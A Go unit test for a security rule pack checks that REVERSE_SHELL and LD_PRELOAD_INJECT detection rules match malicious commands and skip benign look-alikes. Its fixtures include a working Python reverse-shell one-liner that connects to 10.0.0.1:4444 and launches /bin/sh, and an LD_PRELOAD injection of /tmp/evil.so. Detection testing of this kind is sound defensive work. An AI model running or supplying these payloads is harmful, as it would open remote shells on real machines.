package rulepack

import "testing"

// Precision fixes from a real case (v3.1.1): each pair is a shape that must
// still fire and the benign shape that did.
func TestPrecisionFromRealCase(t *testing.T) {
	packs, err := LoadDir("../../rules")
	if err != nil {
		t.Fatal(err)
	}
	by := map[string]*Rule{}
	for i := range packs {
		for j := range packs[i].Rules {
			by[packs[i].Rules[j].ID] = &packs[i].Rules[j]
		}
	}
	cases := []struct {
		rule, cmd string
		want      bool
	}{
		{"REVERSE_SHELL", `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])'`, true},
		{"REVERSE_SHELL", `python3 -c "import socket; s=socket.socket(); print(s.connect_ex(('127.0.0.1',8080)))"`, false},
		{"LD_PRELOAD_INJECT", `LD_PRELOAD=/tmp/evil.so ./app`, true},
		{"LD_PRELOAD_INJECT", `DYLD_INSERT_LIBRARIES=/usr/lib/libgmalloc.dylib ./fuzz`, false},
	}
	for _, c := range cases {
		r := by[c.rule]
		if r == nil {
			t.Fatalf("rule %s missing", c.rule)
		}
		if got := matches(r, c.cmd); got != c.want {
			t.Errorf("%s on %q = %v, want %v", c.rule, c.cmd, got, c.want)
		}
	}
}
